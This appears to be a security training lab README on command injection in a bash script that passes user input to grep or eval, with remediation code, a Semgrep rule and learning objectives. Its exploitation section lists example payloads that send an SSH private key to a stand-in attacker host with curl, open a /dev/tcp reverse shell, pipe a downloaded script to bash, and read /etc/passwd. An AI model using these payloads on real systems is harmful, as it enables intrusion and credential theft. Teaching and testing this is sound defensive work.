# 01 - Command Injection (CWE-77)

## 🎯 Vulnerability Overview

**Risk Level**: 🔴 **CRITICAL**

Command injection occurs when an application executes shell commands using user-controlled input without proper validation or sanitization. Attackers can inject malicious commands that execute with the application's privileges.

## 📋 Details

- **CWE**: [CWE-77: Improper Neutralization of Special Elements used in a Command](https://cwe.mitre.org/data/definitions/77.html)
- **OWASP**: A03:2021 - Injection
- **CVSS Score**: 9.8 (Critical)
- **Attack Complexity**: Low
- **Privileges Required**: None
- **User Interaction**: None

## 🔍 Vulnerable Code

The vulnerable skill executes grep with unquoted user input:

```bash
# VULNERABLE
PATTERN="$1"
grep "$PATTERN" /path/to/files/**/*

# Even worse
eval "grep $PATTERN /path/**/*"
```

## 💥 Exploitation

### Attack Payload Examples

1. **Command Chaining**:
   ```
   Input: TODO"; whoami #
   Executed: grep "TODO"; whoami #" /path/**/*
   Result: Reveals current user
   ```

2. **Data Exfiltration**:
   ```
   Input: x"; curl http://attacker.com/?data=$(cat ~/.ssh/id_rsa) #
   Result: Steals SSH private key
   ```

3. **Reverse Shell**:
   ```
   Input: x"; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 #
   Result: Opens backdoor to attacker
   ```

4. **System Compromise**:
   ```
   Input: x"; curl attacker.com/malware.sh | bash #
   Result: Downloads and executes malware
   ```

## 🛡️ Remediation

### Secure Implementation

```bash
#!/bin/bash
set -euo pipefail

PATTERN="$1"

# 1. INPUT VALIDATION - Whitelist approach
if [[ ! "$PATTERN" =~ ^[a-zA-Z0-9_[:space:].-]+$ ]]; then
    echo "Error: Invalid pattern"
    exit 1
fi

# 2. PROPER QUOTING
# 3. USE grep -F (fixed-string mode)
grep -F "$PATTERN" /path/to/files/**/*

# Alternative: Use arrays for file arguments
declare -a files
mapfile -t files < <(find /path -type f)
grep -F "$PATTERN" "${files[@]}"
```

### Defense Layers

1. **Input Validation**: Whitelist allowed characters
2. **Proper Quoting**: Always quote variables: `"$VAR"`
3. **Avoid Shells**: Use execve() directly if possible
4. **Fixed-String Mode**: Use `grep -F` to disable regex
5. **Least Privilege**: Run with minimal permissions
6. **No eval**: Never use eval/exec with user input

## 🧪 Testing

### Detect Vulnerability

```bash
# Test 1: Command injection
echo 'TODO"; whoami #' | ./vulnerable-skill.sh
# Vulnerable: Executes whoami
# Secure: Treats as literal string

# Test 2: File read attempt
echo 'x"; cat /etc/passwd #' | ./vulnerable-skill.sh
# Vulnerable: Displays /etc/passwd
# Secure: Rejects invalid input
```

### Automated Detection

**Semgrep Rule**:
```yaml
rules:
  - id: bash-command-injection
    languages: [bash]
    pattern-either:
      - pattern: grep "$INPUT" ...
      - pattern: eval "... $INPUT ..."
      - pattern: $CMD $UNQUOTED_VAR ...
    message: Potential command injection
    severity: ERROR
```

**ShellCheck**:
```bash
shellcheck skill.sh
# SC2086: Double quote to prevent globbing and word splitting
```

## 📊 Impact Assessment

| Category | Impact |
|----------|--------|
| **Confidentiality** | 🔴 HIGH - Can read any file |
| **Integrity** | 🔴 HIGH - Can modify/delete files |
| **Availability** | 🔴 HIGH - Can crash system |
| **Privilege Escalation** | 🟠 MEDIUM - Depends on context |
| **Lateral Movement** | 🟠 MEDIUM - Can pivot to other systems |

## 🎓 Learning Objectives

After completing this lab, you should understand:

1. ✅ How command injection vulnerabilities occur
2. ✅ Multiple exploitation techniques
3. ✅ Proper input validation techniques
4. ✅ Safe shell scripting practices
5. ✅ Defense in depth principles

## 🔗 Related Vulnerabilities

- **CWE-78**: OS Command Injection
- **CWE-88**: Argument Injection
- **CWE-94**: Code Injection
- **CWE-20**: Improper Input Validation

## 📚 Additional Resources

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [PortSwigger Command Injection](https://portswigger.net/web-security/os-command-injection)
- [HackTricks Command Injection](https://book.hacktricks.xyz/pentesting-web/command-injection)
- [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)

## 🚀 Challenge

Can you:
1. Identify all injection points in the vulnerable code?
2. Write a regex that detects this vulnerability?
3. Create a Semgrep rule that flags this pattern?
4. Exploit the vulnerability to achieve RCE?
5. Fix the vulnerability with minimal code changes?

---

**Next Lab**: [02 - Path Traversal](../02-path-traversal/README.md)
